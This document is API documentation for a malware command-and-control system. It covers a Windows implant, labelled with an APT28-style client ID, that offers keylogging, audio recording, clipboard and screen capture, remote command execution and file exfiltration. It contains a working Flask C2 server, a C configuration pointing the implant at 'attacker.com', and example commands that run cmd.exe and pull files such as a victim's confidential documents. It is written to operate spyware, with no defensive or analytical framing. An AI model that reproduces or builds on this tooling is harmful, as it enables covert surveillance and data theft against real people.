# C2 HTTP API Documentation

## Overview
The C2 handler communicates with an HTTP server over standard HTTP protocol using Windows API only. The malware periodically contacts the server at random intervals between 60-120 seconds to:
1. Register itself
2. Fetch capability commands
3. Execute capabilities and report results

## Capability Commands

Capabilities are invoked by numeric command IDs:
- `1` - Audio Recorder (start_audio_recorder)
- `2` - Clipboard Monitor (start_clipboard_monitor)
- `3` - Keylogger (start_keylogger)
- `4` - Screenshot (start_screenshot)
- `5` - Info Collector (start_info_collector)
- `6` - Command Executor (execute_command_with_evasion)
- `7` - Location Collector (get_location_info)
- `8` - File Exfiltrator (exfiltrate_file)
- `0` - No Command (idle)

## API Endpoints

### 1. Registration Endpoint
**URL:** `GET /api/register?id=<client_id>`

**Purpose:** Register a new client with the C2 server

**Response:** JSON or text confirmation
```
Example:
GET /api/register?id=APT28_1234_1701619200
```

### 2. Capability Command Fetch Endpoint
**URL:** `GET /api/command?id=<client_id>`

**Purpose:** Retrieve capability command ID and arguments to execute

**Response:** JSON object with capability and args
```json
{
  "capability": 6,
  "args": "cmd.exe /c whoami"
}
```

Example:
```
GET /api/command?id=APT28_1234_1701619200

Response:
{
  "capability": 6,
  "args": "cmd.exe /c ipconfig /all"
}
```

### 3. Report Endpoint
**URL:** `POST /api/report`

**Headers:** `Content-Type: application/json`

**Body:** JSON payload with client ID, capability executed, and result
```json
{
  "id": "APT28_1234_1701619200",
  "capability": 1,
  "result": "executed"
}
```

## Client Behavior

1. **Initialization:** Client generates unique ID: `APT28_<PID>_<TIMESTAMP>`
2. **Registration:** Makes GET request to register endpoint
3. **Capability Loop:** Repeats every 60-120 seconds (random):
   - Sleep for random interval (60-120 seconds)
   - Fetch capability command ID from server
   - Execute the corresponding capability function
   - Report execution result back to server

## Server Implementation Example (Python/Flask)

```python
from flask import Flask, request, jsonify
import uuid
import time

app = Flask(__name__)
commands = {}  # Store pending commands per client
results = []   # Store execution results

@app.route('/api/register', methods=['GET'])
def register():
    client_id = request.args.get('id')
    print(f"[+] Client registered: {client_id}")
    commands[client_id] = 0  # No command by default
    return jsonify({"status": "registered", "id": client_id})

@app.route('/api/command', methods=['GET'])
def get_command():
    client_id = request.args.get('id')
    cmd = commands.get(client_id, 0)
    print(f"[*] Capability command sent to {client_id}: {cmd}")
    return str(cmd)

@app.route('/api/report', methods=['POST'])
def report():
    data = request.get_json()
    client_id = data.get('id')
    capability = data.get('capability')
    result = data.get('result')
    print(f"[+] Result from {client_id} - Capability {capability}: {result}")
    results.append({
        "client": client_id,
        "capability": capability,
        "result": result,
        "time": time.time()
    })
    return jsonify({"status": "received"})

# To send capability command to client
def send_capability_to_client(client_id, capability_id):
    commands[client_id] = capability_id
    print(f"[*] Assigned capability {capability_id} to {client_id}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)
```

## Configuration

To change the C2 server URL and port, modify in `c2_handler.c`:
```c
#define C2_SERVER "attacker.com"
#define C2_PORT 80
```

## Sending Commands with Arguments

The C2 server now supports passing arguments to capabilities:

**POST to `/api/send_command`:**
```json
{
  "client_id": "APT28_1234_1701619200",
  "capability_id": 6,
  "args": "cmd.exe /c whoami && ipconfig"
}
```

**Argument Usage by Capability:**
- **Capability 6 (Command Executor)**: Full command string (e.g., `"cmd.exe /c dir C:\\"`)
- **Capability 8 (File Exfiltrator)**: Full file path to exfiltrate (e.g., `"C:\\Users\\victim\\Documents\\secret.txt"`)
- **Other Capabilities**: Reserved for future use (currently optional)

**Client Fetches Command:**
```json
GET /api/command?id=APT28_1234_1701619200

Response:
{
  "capability": 6,
  "args": "cmd.exe /c whoami && ipconfig"
}
```

The client parses the JSON response and executes the capability with the provided arguments.

## File Exfiltration

The file exfiltration capability (ID 8) allows remote extraction of files from the client machine.

### Sending File Exfiltration Command

**POST to `/api/send_command`:**
```json
{
  "client_id": "APT28_DESKTOP-ABC_JohnDoe",
  "capability_id": 8,
  "args": "C:\\Users\\victim\\Documents\\confidential.pdf"
}
```

### Client Processing

The client will:
1. Receive the command with file path
2. Read the file from disk
3. Base64 encode the file content
4. Send back a JSON structure (base64-encoded) containing:
   - `filename`: Name of the file
   - `size`: File size in bytes
   - `content`: Base64-encoded file content

### Server Storage

The server automatically:
1. Detects file exfiltration results (capability 8)
2. Parses the JSON structure
3. Stores file metadata and content in `exfiltrated_files` table
4. Also stores in regular `results` table for audit

### Retrieving Exfiltrated Files

**List all exfiltrated files:**
```
GET /api/files
GET /api/files?client_id=APT28_DESKTOP-ABC_JohnDoe
```

**Get files from specific client:**
```
GET /api/client/<client_id>/files
```

**Get file metadata and content:**
```
GET /api/files/<file_id>
```

**Download file (decoded binary):**
```
GET /api/files/<file_id>/download
```

### Response Format

**List files response:**
```json
{
  "status": "success",
  "count": 2,
  "files": [
    {
      "id": 1,
      "client_id": "APT28_DESKTOP-ABC_JohnDoe",
      "filename": "confidential.pdf",
      "original_path": "C:\\Users\\victim\\Documents\\confidential.pdf",
      "file_size": 45678,
      "timestamp": "2026-01-01T12:00:00",
      "ip": "192.168.1.100"
    }
  ]
}
```

**Get single file response:**
```json
{
  "status": "success",
  "file": {
    "id": 1,
    "client_id": "APT28_DESKTOP-ABC_JohnDoe",
    "filename": "confidential.pdf",
    "original_path": "C:\\Users\\victim\\Documents\\confidential.pdf",
    "file_size": 45678,
    "content": "base64_encoded_content_here...",
    "timestamp": "2026-01-01T12:00:00",
    "ip": "192.168.1.100"
  }
}
```

### Error Handling

If file cannot be read, the client returns an error message:
```json
{
  "error": "Failed to open file",
  "filepath": "C:\\nonexistent.txt"
}
```

### Limitations

- Maximum file size: 50 MB (configurable in client code)
- Files are base64-encoded, increasing transmission size by ~33%
- Large files may take time to transmit

## Implementation Notes

- Uses Windows API exclusively (WinINet for HTTP communication)
- Client ID includes process ID and timestamp for uniqueness
- Communication is over HTTP (consider HTTPS for production environments)
- JSON responses for command fetch (with capability and args)
- Simple JSON parser implemented in C for client-side parsing
- No authentication implemented
- Capabilities are started as threads by the C2 handler

